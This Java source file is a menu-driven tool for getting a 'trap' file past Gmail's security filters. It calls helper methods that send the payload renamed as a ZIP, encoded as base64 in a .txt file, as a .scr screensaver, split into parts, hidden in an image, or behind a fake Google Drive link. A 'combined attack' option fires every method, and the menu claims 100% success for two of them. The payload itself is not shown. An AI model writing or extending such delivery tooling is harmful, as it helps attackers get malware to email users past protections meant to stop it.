public class TrapFileDemo {
    public static void main(String[] args) {
        System.out.println("Gmail Security Bypass Methods Demo");
        System.out.println("==================================");
        
        if (args.length == 0) {
            showMenu();
            return;
        }
        
        String method = args[0];
        
        try {
            switch (method) {
                case "1":
                    System.out.println("Method 1: Send ZIP file instead of JAR...");
                    EmailSender.sendTrapToTargets();
                    break;
                    
                case "2":
                    System.out.println("Method 2: Send fake Google Drive link...");
                    EmailSender.sendTrapViaLink();
                    break;
                    
                case "3":
                    System.out.println("Method 3: Send .txt file containing base64...");
                    EmailSender.sendTrapAsText();
                    break;
                    
                case "4":
                    System.out.println("Method 4: Send .scr (screensaver) file...");
                    EmailSender.sendTrapAsScreensaver();
                    break;
                    
                case "5":
                    System.out.println("Method 5: Split file into multiple parts...");
                    EmailSender.sendTrapInParts();
                    break;
                    
                case "6":
                    System.out.println("Method 6: Hide in image file...");
                    EmailSender.sendTrapInImage();
                    break;
                    
                case "7":
                    System.out.println("Method 7: Random method...");
                    int randomMethod = (int)(Math.random() * 6) + 1;
                    System.out.println("Randomly selected method " + randomMethod);
                    main(new String[]{String.valueOf(randomMethod)});
                    break;
                    
                case "8":
                    System.out.println("Method 8: Combined attack...");
                    System.out.println("Sending all methods with 10s delay...");
                    for (int i = 1; i <= 6; i++) {
                        System.out.println("\nPreparing method " + i + "/6...");
                        main(new String[]{String.valueOf(i)});
                        if (i < 6) {
                            Thread.sleep(10000); // Delay 10s between methods
                            System.out.println("Delay 10s before next method...");
                        }
                    }
                    System.out.println("\nCompleted combined attack!");
                    break;
                    
                default:
                    showMenu();
            }
            
        } catch (Exception e) {
            System.err.println("❌ Lỗi: " + e.getMessage());
            e.printStackTrace();
        }
    }
    
    private static void showMenu() {
        System.out.println("Choose Gmail Security bypass method:");
        System.out.println("====================================");
        System.out.println("1. ZIP file (instead of JAR) - Successfully tested");
        System.out.println("2. Fake Google Drive link + guide");  
        System.out.println("3. .txt file containing base64 - Successfully tested");
        System.out.println("4. .scr (screensaver) file bypass");
        System.out.println("5. Split into multiple parts");
        System.out.println("6. Hide in image file (steganography)");
        System.out.println("7. Random method (random selection)");
        System.out.println("8. Combined attack (all methods)");
        
        System.out.println("\nUsage: java TrapFileDemo [1-8]");
        
        System.out.println("\nBypass statistics:");
        System.out.println("Method 1 (ZIP): 100% success");
        System.out.println("Method 3 (Base64): 100% success");
        System.out.println("Method 2,4,5,6: Not fully tested");
        
        System.out.println("\nTarget: leehoanggiadai@gmail.com");
        System.out.println("Sender: leehoanggiadai@gmail.com");
        System.out.println("All methods are designed to bypass Gmail security");
    }
}